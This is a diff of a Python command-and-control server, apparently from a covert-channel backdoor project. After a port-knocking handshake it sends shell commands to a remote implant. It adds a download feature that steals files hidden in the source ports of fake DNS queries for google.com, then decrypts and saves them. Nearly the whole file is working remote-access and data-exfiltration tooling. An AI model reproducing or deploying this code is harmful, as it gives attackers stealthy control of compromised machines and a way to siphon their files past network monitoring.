@@ -6,10 +6,11 @@ import knocker
 from scapy.all import *
 from dcutils import decrypt
 
-EOL = 'Z'
 EOF = 'G'
-RECEIVING = 0
+PATH_TO_FILE = "./data/"
 CONTENT = ""
+DOWNLOAD_FILE_SIZE = 0
+DOWNLOAD_FILE_NAME = ""
 
 def upload(conn,command,filepath):
     if os.path.isfile(filepath):
@@ -24,6 +25,18 @@ def upload(conn,command,filepath):
     else:
         print "Invalid Usage of \"upload\", update filename"
 
+def download(conn, filepath):
+    global CONTENT
+    global DOWNLOAD_FILE_SIZE
+    CONTENT = ""
+    DOWNLOAD_FILE_SIZE = conn.recv(1024)
+    if int(DOWNLOAD_FILE_SIZE) < 1:
+        print "file name is invalid"
+    else:
+        global DOWNLOAD_FILE_NAME
+        DOWNLOAD_FILE_NAME = filepath.split('/')[-1]
+        sniff(filter="udp", stop_filter=parse_for_download)
+
 
 def accept_commands(conn):
     # receive initial connection
@@ -31,26 +44,24 @@ def accept_commands(conn):
     # start loop
     while 1:
         # enter shell command
-        global RECEIVING
-        if RECEIVING == 0:
-            command = raw_input("Enter shell command or quit: ")
-            cmdArgs = command.split(' ')
-            # if we specify quit then break out of loop and close socket
-            if cmdArgs[0] == "quit":
-                conn.send(command)
-                break
-            if cmdArgs[0] == "upload":
-                upload(conn,command,cmdArgs[1])
-            else:
-                conn.send(command)
-                RECEIVING = 1
-                global CONTENT
-                CONTENT = ""
-                sniff(filter="udp", prn=parse)
-                # receive output from linux command
-                #data = conn.recv(1024)
-                # print the output of the linux command
-                #print data
+        command = raw_input("Enter shell command or quit: ")
+        cmdArgs = command.split(' ')
+        # if we specify quit then break out of loop and close socket
+        if cmdArgs[0] == "quit":
+            conn.send(command)
+            break
+        elif cmdArgs[0] == "upload":
+            upload(conn,command,cmdArgs[1])
+
+        elif cmdArgs[0] == "download":
+            conn.send(command)
+            download(conn, cmdArgs[1])
+        else:
+            conn.send(command)
+            # receive output from linux command
+            data = conn.recv(1024)
+            # print the output of the linux command
+            print data
 
 
 
@@ -77,38 +88,53 @@ def listen():
     conn.close()
     s.close()
 
+
+def parse_for_download(pkt):
+    return_value = False
+    if pkt.haslayer(DNS) and pkt['DNS'].qd[DNSQR].qname == "google.com." :
+        srcPort = hex(pkt['UDP'].sport)
+        if pkt['UDP'].sport > 4095:
+            return_value = parse_by_character(chr(int(srcPort[2:4], 16)))
+            return_value = return_value or parse_by_character(chr(int(srcPort[4:], 16)))
+        else:
+            return_value = parse_by_character(chr(int(srcPort[2], 16)))
+            return_value = return_value or parse_by_character(chr(int(srcPort[3:], 16)))
+    return return_value
+
+
 def parse_by_character(char):
     global CONTENT
+    global DOWNLOAD_FILE_SIZE
     if char == EOF:
-        print "received data: "+ CONTENT
-        decrypted = decrypt(CONTENT , knocker.PASS)
-        print decrypted
-        global RECEIVING
-        RECEIVING = 0
-    #elif char == EOL:
-    #    sys.stdout.write("\n")
-    #    sys.stdout.flush()
+        print len(CONTENT)
+        if DOWNLOAD_FILE_SIZE == str(len(CONTENT)):
+            decrypted = decrypt(CONTENT , knocker.PASS)
+            global PATH_TO_FILE
+            global DOWNLOAD_FILE_NAME
+            if not os.path.exists(PATH_TO_FILE):
+                os.makedirs(PATH_TO_FILE)
+            with open(PATH_TO_FILE +DOWNLOAD_FILE_NAME, 'w') as f:
+                f.write(decrypted)
+            print "data is successfully saved to " + PATH_TO_FILE + DOWNLOAD_FILE_NAME
+        else:
+            print "some data is missing. cannot decrypt the file"
+        return True
     else:
         CONTENT += char
+        return False
 
 def parse(pkt):
-    global RECEIVING
     if pkt.haslayer(UDP) and pkt['UDP'].dport == knocker.PORT_KNOCKER[knocker.PORT_KNOCKER_INDEX]:
         knocker.port_knock(pkt)
         if len(knocker.PASS) == len(knocker.PORT_KNOCKER)*2:
-            print knocker.PASS
-            listen()
-    elif  pkt.haslayer(DNS) and pkt['DNS'].qd[DNSQR].qname == "google.com." and RECEIVING:
-        srcPort = hex(pkt['UDP'].sport)
-        if pkt['UDP'].sport > 4095:
-            parse_by_character(chr(int(srcPort[2:4],16)))
-            parse_by_character(chr(int(srcPort[4:], 16)))
+            return True
         else:
-            parse_by_character(chr(int(srcPort[2],16)))
-            parse_by_character(chr(int(srcPort[3:], 16)))
+            return False
+
 
 def main():
-    sniff(filter="udp", prn=parse)
+    sniff(filter="udp", stop_filter=parse)
+    listen()
 
 if __name__ == '__main__':
     main()
